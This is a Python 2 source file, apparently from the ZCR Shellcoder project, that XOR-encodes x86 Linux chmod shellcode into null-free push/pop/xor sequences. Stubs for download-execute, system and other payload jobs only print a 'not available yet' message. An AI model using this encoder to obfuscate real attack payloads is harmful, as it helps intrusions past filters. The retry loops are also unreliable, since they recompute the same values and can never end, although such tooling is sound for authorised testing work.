#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
def start(type,shellcode,job):
	if 'chmod(' in job:	
		t = True
		eax = str('0x0f909090')
		shellcode = shellcode.replace('0x0f',eax)
		while t:
			eax_1 = type.rsplit('xor_')[1][2:]
			eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
			if '00' not in eax_1 and '00' not in eax_2 and len(eax_1) >= 7 and len(eax_2) >= 7:
				t = False
		eax = 'push   $%s'%(str(eax))
		eax_xor = 'push $0x%s\npop %%eax\npush $0x%s\npop %%ebx\nxor %%eax,%%ebx\nshr $0x10,%%ebx\nshr $0x8,%%ebx\npush %%ebx\n'%(eax_1,eax_2)
		shellcode = shellcode.replace(eax,eax_xor)
		ecx = str(shellcode.rsplit('\n')[10])
		ecx_value = str(shellcode.rsplit('\n')[10].rsplit()[1][1:])
		t = True
		while t:
			ecx_1 = type.rsplit('xor_')[1][2:]
			ecx_2 = "%x" % (int(ecx_value, 16) ^ int(ecx_1, 16))
			if '00' not in ecx_1 and '00' not in ecx_2:
				t = False
		ecx_xor = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%ecx\nxor %%ecx,%%ebx\npush %%ebx\n_z3r0d4y_\n'%(str(ecx_1),str(ecx_2))
		shellcode = shellcode.replace(ecx,ecx_xor)
		n = 0
		start = ''
		middle = ''
		end = ''
		add = 0
		for l in shellcode.rsplit('\n'):
			n += 1
			if add is 0:
				if '_z3r0d4y_' not in l:
					start += l + '\n'
				else:
					add = 1
			if add is 1:
				if '_z3r0d4y_' not in l:
					if '%esp,%ebx' not in l:
						middle += l + '\n'
					else:
						add = 2
			if add is 2:
				end += l + '\n'
		for l in middle.rsplit('\n'):
			if 'push $0x' in l:
				ebx = l.rsplit()[1][1:]
				ebx_1 = type.rsplit('xor_')[1][2:]
				ebx_2 = "%x" % (int(ebx, 16) ^ int(ebx_1, 16))
				command = 'push $0x%s\npop %%ebx\npush $0x%s\npop %%edx\nxor %%ebx,%%edx\npush %%edx'%(str(ebx_1),str(ebx_2))
				middle = middle.replace(l,command)
		shellcode = start + middle + end
	if 'dir_create(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'download_execute(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'download(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'exc(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'file_create(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'script_executor(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'system(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	if 'write(' in job:
		print 'This encoding feature is not available yet, please wait for next versions.'
	return shellcode